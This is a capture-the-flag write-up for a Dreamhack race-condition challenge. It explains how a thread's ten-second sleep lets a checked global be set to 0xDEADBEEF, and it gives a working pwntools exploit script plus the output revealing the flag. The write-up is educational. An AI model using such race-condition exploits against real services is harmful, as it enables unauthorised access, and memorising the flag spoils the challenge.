This is basic race condition vulnerability. Let's figure it out with me!
## Source code
```c
void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
{
  int v3; // [rsp+4h] [rbp-1Ch] BYREF
  pthread_t newthread; // [rsp+8h] [rbp-18h] BYREF
  void *ptr; // [rsp+10h] [rbp-10h]
  unsigned __int64 v6; // [rsp+18h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  sub_1369(a1, a2, a3);
  ptr = (void *)sub_13D7("./flag");
  qword_4030 = 0LL;
  while ( 1 )
  {
    sub_154B();
    printf("Input: ");
    __isoc99_scanf("%u", &v3);
    if ( v3 == 4 )
    {
      free(ptr);
      exit(0);
    }
    if ( v3 > 4 )
    {
LABEL_16:
      puts("Invalid Menu! Please try again.");
    }
    else
    {
      switch ( v3 )
      {
        case 3:
          if ( qword_4030 == 0xDEADBEEFLL )
            printf("Flag : %s\n", (const char *)ptr);
          else
            puts("Don't have permission!");
          break;
        case 1:
          printf("Input: ");
          __isoc99_scanf("%lu", &qword_4038);
          break;
        case 2:
          if ( pthread_create(&newthread, 0LL, start_routine, 0LL) )
          {
            perror("Thread creation failed\n");
            exit(1);
          }
          pthread_detach(newthread);
          break;
        default:
          goto LABEL_16;
      }
    }
  }
}
```
Yeah in the main function, we have 3 options:
* option 1: input to `qword_4038` 
* option 2: create a new thread in `start_routine()` function
* option 3: check flag if `qword_4030 == 0xDEADBEEF` 
```c
void *__fastcall start_routine(void *a1)
{
  if ( qword_4038 != 0xDEADBEEFLL )
  {
    sleep(0xAu);
    qword_4030 = qword_4038;
  }
  return 0LL;
}
```

So in `start_routine` this thread will run parallel with main function and it will check:
if `qword_4038 != 0xDEADBEEF` then sleep(10) and `qword_4030 = qword_4038` 
The vulnerability lies on this thread

Initially `qword_4038 = 0` so we will bypass this if condition.
And then we have a chance in 10s to modify the value of `qword_4038 = 0xDEADBEEF` from input by option 1.

After that 10s in the `start_routine`, the value of `qword_4030` will be set to `qword_4038`. And because that variable was assign from the input equal to `0xDEADBEEF` before, so `qword_4030` will equal to `0xDEADBEEF` too.

Thus, just choose option 3 to check flag.
Exploit code:

```py
from pwn import *

# Correct connection to remote server
p = remote('host3.dreamhack.games', 21530)
p.sendlineafter(b"Input: ", b"2")
p.sendlineafter(b"Input: ", b"1")
p.sendlineafter(b"Input: ", str(0xDEADBEEF).encode())
sleep(10)
p.sendlineafter(b"Input: ", b"3")
print(p.recvline())

```
Output:
```
$ python3 exploit.py 
[+] Opening connection to host3.dreamhack.games on port 21530: Done
b'Flag : DH{y0u_c4n_r4c3_w17h_m3!!}\n'
[*] Closed connection to host3.dreamhack.games port 21530
```